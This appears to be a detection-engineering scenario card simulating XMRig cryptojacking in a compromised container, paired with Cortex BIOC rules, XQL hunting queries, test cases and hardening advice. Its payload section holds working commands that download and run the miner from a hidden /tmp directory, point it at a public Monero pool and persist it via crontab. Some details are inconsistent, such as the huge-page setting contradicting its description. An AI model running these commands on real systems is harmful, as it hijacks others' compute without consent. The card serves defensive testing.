identity.name: Cryptominer Deployment — XMRig Resource Hijacking in Containers (T1496)
identity.summary: A compromised container tunes the host for mining (ulimit/sysctl/transparent-hugepage), downloads the XMRig binary into a hidden /tmp directory, writes a Monero pool config pointing at pool.minexmr.com, runs the miner from a low-privilege identity, and persists it via crontab. Cortex Cloud runtime defense and XDR container BIOCs flag the XMRig binary execution, the stratum pool config, the cron…
identity.description: Cryptojacking is the most common monetization of compromised cloud workloads: Unit 42's large-scale Monero operation dropped XMRig into exposed containers and cloud hosts, tuned the kernel for hashing performance, connected to public mining pools, and re-launched the miner from cron to survive restarts. This scenario reproduces that kill chain from a non-root container identity — disabling resource limits and enabling huge pages, downloading the XMRig release tarball into /tmp/.xmr, writing a pool config targeting pool.minexmr.com:4444, executing the miner (capped at 30s for the lab), and installing a */5 crontab entry for persistence. The detection approach is container-context behavioral analysis plus content matching: Cortex flags the XMRig binary transfer, the known stratum pool string in the config, the crontab modification referencing the miner, and the sustained high-CPU process tree characteristic of mining. A correlation rule stitches the staging, execution, and persistence stages from one container into a single high-severity Impact incident.

techniques.name: Impair Defenses: Disable or Modify Tools

execution.framework_reference_id: T1496 — XMRig deployment, stratum pool connection, and cron persistence inside a container.

prerequisites.description: Cortex Cloud runtime defender (or Cortex XDR Linux agent) installed and reporting on the container host/node.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i defender

prerequisites.description: Lab environment matching scenario SIM-CDR-002 — container with curl/tar available and outbound egress permitted (lab only).

payload.code:
# XMRig cryptominer deploy/execute/persist — capped runtime, simulation wallet only.
ulimit -n 65535 2>/dev/null; echo never > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true; mkdir -p /tmp/.xmr
curl -sSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -o /tmp/.xmr/xmrig.tar.gz && tar -xzf /tmp/.xmr/xmrig.tar.gz -C /tmp/.xmr/ --strip-components=1 && chmod +x /tmp/.xmr/xmrig
printf '{"pools":[{"url":"pool.minexmr.com:4444","user":"SIMULATION_WALLET_DO_NOT_USE"}]}' > /tmp/.xmr/config.json
timeout 30 /tmp/.xmr/xmrig --config /tmp/.xmr/config.json --no-color | head -50
(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json >/dev/null 2>&1') | crontab -

expected_artifacts.description: XMRig binary executing inside a container.
Mining pool config referencing a known stratum pool written to a hidden /tmp directory.
crontab invoked to schedule the miner for persistence.
Outbound TCP to a stratum mining-pool port.

cleanup.code:
crontab -l 2>/dev/null | grep -v xmrig | crontab - 2>/dev/null || true
rm -rf /tmp/.xmr
echo '[CortexSim] SIM-CDR-002 cleanup complete'

iocs.context: Public Monero mining pool referenced in the XMRig config — strong cryptojacking indicator.
XMRig Monero miner binary staged in a hidden /tmp directory inside the container.

biocs.name: CDR-002 Container Resource Limit Tuning Pre-Mining
biocs.description: System limit modification in container — ulimit/sysctl tuning consistent with cryptominer pre-deployment. A container process raises resource limits or enables huge pages to maximize hashing throughput.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("sysctl", "ulimit", "bash", "sh")
| filter action_process_image_command_line contains_any ("transparent_hugepage", "vm.nr_hugepages", "ulimit -n", "ulimit -u")

biocs.name: CDR-002 XMRig Binary Download And Extraction In Container
biocs.description: XMRig binary download and extraction — cryptominer tool transfer signature. A container process fetches the XMRig release tarball and extracts the miner binary.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("curl", "wget", "tar")
| filter action_process_image_command_line contains_any ("xmrig", "xmrig-6", "linux-static")

biocs.name: CDR-002 Compressed Binary Extracted To Hidden Tmp In Container
biocs.description: Compressed binary downloaded and extracted to /tmp hidden directory in container. A tarball is unpacked into a dot-prefixed /tmp staging directory to evade casual inspection.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "tar"
| filter action_process_image_command_line contains "/tmp/."
| filter action_process_image_command_line contains_any (".tar.gz", "-xz", "--strip-components")

biocs.name: CDR-002 Known Mining Pool In Config File In Container
biocs.description: Known cryptomining pool domain/IP in config file — pool.minexmr.com association. A config file written in the container references a known public stratum mining pool.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter container_id != null
| filter action_file_extension = "json"
| filter action_file_path contains "config"
| filter actor_process_image_name in ("bash", "sh", "cat", "tee", "python3")

biocs.name: CDR-002 XMRig Process Execution In Container
biocs.description: Cryptominer binary execution — XMRig process tree detected by CDR runtime BIOC. The xmrig binary launches inside a container, optionally with --config pointing at a pool.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "xmrig" or action_process_image_command_line contains_any ("xmrig", "--config", "stratum+tcp", "--max-threads-hint")

biocs.name: CDR-002 Sustained High CPU Mining Workload In Container
biocs.description: Sustained CPU spike from container process consistent with cryptomining workload. A long-lived container process drives high CPU utilization characteristic of hashing.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter container_id != null
| filter actor_process_image_name in ("xmrig", "kdevtmpfsi", "kinsing")
| filter action_total_cpu_pct >= 80

biocs.name: CDR-002 Crontab Modification To Persist Cryptominer In Container
biocs.description: Crontab modification to persist cryptominer — scheduled task creation from container. crontab is invoked to install a recurring job that re-launches the miner.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "crontab"
| filter action_process_image_command_line contains_any ("xmrig", "-", "/tmp/.xmr")

biocs.name: CDR-002 Cryptominer Added To Cron Schedule In Container
biocs.description: Cryptominer binary added to cron schedule — multi-stage malware persistence behavior. A cron spool/tab file is written that references the miner binary path.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter container_id != null
| filter action_file_path contains_any ("/var/spool/cron", "/etc/cron", "crontab")
| filter actor_process_image_name in ("crontab", "bash", "sh", "tee")

xql_queries.name: CDR-002 Validate XMRig Execution In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "xmrig" or action_process_image_command_line contains "xmrig"
| fields _time, agent_hostname, container_id, actor_effective_username, actor_process_image_name, action_process_image_command_line

xql_queries.name: CDR-002 Validate Mining Pool Config Or Download In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter container_id != null
| filter action_process_image_command_line contains_any ("pool.minexmr.com", "stratum+tcp", "xmrig-6", "linux-static")
| fields _time, agent_hostname, container_id, actor_process_image_name, action_process_image_command_line

xql_queries.name: CDR-002 Validate Cron Persistence Of Miner In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "crontab" and action_process_image_command_line contains "xmrig"
| fields _time, agent_hostname, container_id, action_process_image_command_line

correlation_rules.name: Cryptominer Deploy Execute Persist — Same Container
correlation_rules.logic: BIOC(CDR-002 XMRig Binary Download And Extraction In Container) OR BIOC(CDR-002 Known Mining Pool In Config File In Container) OR BIOC(CDR-002 XMRig Process Execution In Container) OR BIOC(CDR-002 Sustained High CPU Mining Workload In Container) OR BIOC(CDR-002 Crontab Modification To Persist Cryptominer In Container) OR BIOC(CDR-002 Cryptominer Added To Cron Schedule In Container)

analytics_modules: Cortex Cloud Runtime Defense — Cryptominer process and stratum pool detection
Cortex XDR Analytics — Sustained high-CPU container process with mining pool egress

products.evidence_query: preset = xdr_data | filter container_id != null | filter action_process_image_command_line contains "xmrig" | fields _time, container_id, action_process_image_command_line
preset = xdr_data | filter actor_process_image_name = "xmrig" | fields _time, container_id, action_total_cpu_pct, action_process_image_command_line
DNS resolution of pool.minexmr.com from the workload subnet flagged as cryptomining C2.
Correlation CR-CDR-0002 fuses XMRig staging, pool config, execution, high-CPU, and cron persistence from one container into a single Impact incident.

use_cases.name: Cryptomining Activity Detection — XMRig Kill Chain
use_cases.description: Detect and stitch the XMRig deploy-execute-persist cryptojacking chain inside a compromised container.

test_cases.objective: XMRig execution and mining-pool config fire their Cortex container BIOCs.
preconditions: Cortex Cloud runtime defender or Cortex XDR Linux agent >= 8.4.0 reporting on the node.
BIOCs from this card imported and enabled.
steps: Run SIM-CDR-002 steps 1-5 inside the lab container.
Observe BIOC alerts per stage in the Cortex console.
success_criteria: BIOC `CDR-002 XMRig Process Execution In Container` fires within 60s of miner launch.
BIOC `CDR-002 Crontab Modification To Persist Cryptominer In Container` fires on persistence.
All three XQL validation queries return >= 1 row.

test_cases.objective: Deploy/execute/persist stages stitch into one Impact incident.
success_criteria: Correlation `CR-CDR-0002` groups the stages from one container_id into one incident.
Incident severity is High or Critical.

preventive_controls: Run containers with a read-only root filesystem and dropped capabilities so /tmp execution and kernel tuning fail.
Block egress to known mining pools with Advanced DNS Security and a default-deny network policy.
Enforce a runtime binary allowlist per image so xmrig can never execute.
detection_engineering: Alert on any container process named xmrig or any config referencing a stratum/mining-pool URL.
Alert on sustained high-CPU container processes correlated with outbound pool ports (4444/3333/5555).
Hunt for crontab modifications and /tmp hidden-directory binary execution from container lineages.

references.title: Unit42 - Large-Scale Monero Cryptocurrency Mining Operation Using XMRig
